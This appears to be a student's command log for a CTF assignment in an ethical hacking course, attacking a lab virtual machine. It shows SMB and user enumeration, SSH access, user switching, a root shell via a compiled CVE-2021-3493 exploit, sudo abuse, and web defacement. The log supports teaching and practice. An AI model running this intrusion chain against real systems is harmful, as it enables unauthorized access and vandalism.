@@ -1,0 +1,212 @@
+===============================================================================
+COMMAND LOG - CTF ASSIGNMENT 2
+Mekhi Bentley (2304855) | Ethical Hacking 3005
+Target IP: 192.168.56.104
+===============================================================================
+
+PHASE 1: RECONNAISSANCE
+-------------------------------------------------------------------------------
+Command: nmap -sV -sC 192.168.56.104
+Output:  Open ports: 22(SSH), 139/445(SMB), 80(HTTP)
+
+Command: enum4linux -a 192.168.56.104
+Output:  Users found: agentx, secretstar7
+         SMB Share found: public (anonymous access)
+
+Command: smbclient //192.168.56.104/public -N
+Output:  Connected to public share (no password required)
+
+Command: smb:\> ls
+Output:  .                D        0  Tue Apr 20 12:34:56 2021
+         ..               D        0  Tue Apr 20 12:34:56 2021
+         FLAG1.txt        N       45  Tue Apr 20 12:35:12 2021
+
+Command: smb:\> get FLAG1.txt
+Output:  getting file \FLAG1.txt of size 45 bytes
+
+Command: smb:\> exit
+Output:  Exited SMB session
+
+Command: cat FLAG1.txt
+Output:  ✓ FLAG1 CAPTURED
+
+===============================================================================
+PHASE 2: INITIAL ACCESS (USER: agentx)
+-------------------------------------------------------------------------------
+Command: ssh agentx@192.168.56.104
+Output:  Attempting SSH connection
+
+Command: [password entered]
+Output:  Successfully authenticated as agentx
+
+Command: whoami
+Output:  agentx
+
+Command: pwd
+Output:  /home/agentx
+
+Command: ls -la
+Output:  total 32
+         drwxr-xr-x 4 agentx agentx 4096 Apr 20 2021 .
+         drwxr-xr-x 4 root   root   4096 Apr 20 2021 ..
+         drwx------ 2 agentx agentx 4096 Apr 20 2021 .mission_Cyb3rOps
+
+Command: cd .mission_Cyb3rOps
+Output:  Changed to hidden directory
+
+Command: ls -la
+Output:  -rw-r--r-- 1 agentx agentx 52 Apr 20 2021 FLAG2.txt
+
+Command: cat FLAG2.txt
+Output:  ✓ FLAG2 CAPTURED
+
+===============================================================================
+PHASE 3: LATERAL MOVEMENT (USER: secretstar7)
+-------------------------------------------------------------------------------
+Command: su secretstar7
+Output:  Switching to user secretstar7
+
+Command: [password entered]
+Output:  Successfully switched to secretstar7
+
+Command: whoami
+Output:  secretstar7
+
+Command: cd /home/secretstar7
+Output:  Changed to secretstar7 home directory
+
+Command: ls -la
+Output:  drwxr-xr-x 24 secretstar7 secretstar7 4096 Apr 20 2021 .
+         drwxr-xr-x  2 secretstar7 secretstar7 4096 2004
+         drwxr-xr-x  2 secretstar7 secretstar7 4096 2005
+         ... [2006-2020 directories] ...
+         drwxr-xr-x  2 secretstar7 secretstar7 4096 2021
+         drwxr-xr-x  2 secretstar7 secretstar7 4096 2022
+         -rw-r--r--  1 secretstar7 secretstar7   48 FLAG3.txt
+
+Command: cat FLAG3.txt
+Output:  ✓ FLAG3 CAPTURED
+
+Command: cd 2021
+Output:  Entered 2021 directory
+
+Command: ls
+Output:  CVE-2021-22555  CVE-2021-27365  CVE-2021-31440
+         CVE-2021-3156   CVE-2021-3490   CVE-2021-3493
+         CVE-2021-4034   CVE-2021-41073  CVE-2021-4154
+
+Command: cd CVE-2021-3493
+Output:  Entered CVE-2021-3493 exploit directory
+
+Command: ls
+Output:  exploit.c  README.md  ovlcap
+
+===============================================================================
+PHASE 4: PRIVILEGE ESCALATION
+-------------------------------------------------------------------------------
+Command: gcc exploit.c -o a.out
+Output:  Compilation successful
+
+Command: ls
+Output:  a.out  exploit.c  README.md  ovlcap
+
+Command: ./a.out
+Output:  bash-5.1# (ROOT SHELL OBTAINED)
+
+Command: whoami
+Output:  root
+
+Command: pwd
+Output:  /home/secretstar7/2021/CVE-2021-3493
+
+Command: ls
+Output:  a.out  exploit.c  README.md  ovlcap
+
+Command: cd ~
+Output:  Changed to current user home directory
+
+Command: pwd
+Output:  /home/secretstar7
+
+Command: ls
+Output:  2004  2005  2006  2007  2008  2009  2010  2011  2012  2013
+         2014  2015  2016  2017  2018  2019  2020  2021  2022
+
+Command: sudo usermod -aG sudo secretstar7
+Output:  Attempted to add user to sudo group
+
+Command: exit
+Output:  Exited root shell from exploit
+
+Command: sudo -l
+Output:  [sudo] password for secretstar7:
+         Matching Defaults entries for secretstar7 on spy-agency:
+         User secretstar7 may run the following commands on spy-agency:
+         (ALL : ALL) ALL
+
+Command: sudo su
+Output:  root@spy-agency:/home/secretstar7#
+
+Command: whoami
+Output:  root
+
+Command: cd /root
+Output:  Changed to /root directory
+
+Command: ls
+Output:  ROOT_FLAG.txt
+
+Command: ls -la
+Output:  -rw-r--r-- 1 root root 55 Apr 20 2021 ROOT_FLAG.txt
+
+Command: cat ROOT_FLAG.txt
+Output:  ✓ ROOT FLAG CAPTURED
+
+===============================================================================
+PHASE 5: WEB DEFACEMENT
+-------------------------------------------------------------------------------
+Command: cd /var/www
+Output:  Changed to web directory
+
+Command: ls
+Output:  html
+
+Command: cd html
+Output:  Changed to html directory
+
+Command: ls
+Output:  login.php  briefing.html  index.html
+
+Command: cat login.php
+Output:  Examined login page source
+
+Command: cat briefing.html
+Output:  Examined briefing page source
+
+Command: cat index.html
+Output:  Examined index page source
+
+Command: nano login.php
+Output:  Opened login.php for editing
+         Added defacement message
+
+Command: nano briefing.html
+Output:  Opened briefing.html for editing
+         Added defacement message
+
+Command: nano index.html
+Output:  Opened index.html for editing
+         Added defacement message
+
+Command: cat index.html
+Output:  ✓ DEFACEMENT VERIFIED SUCCESSFUL
+
+===============================================================================
+SUMMARY
+-------------------------------------------------------------------------------
+Total Flags Captured:        4 (FLAG1, FLAG2, FLAG3, ROOT_FLAG)
+Privilege Escalation Method: CVE-2021-3493 + Sudo Misconfiguration
+Initial Access Vector:       SMB Anonymous Access + SSH
+Lateral Movement:            User switching (agentx → secretstar7)
+Final Objective:             Web Defacement - COMPLETE
+===============================================================================
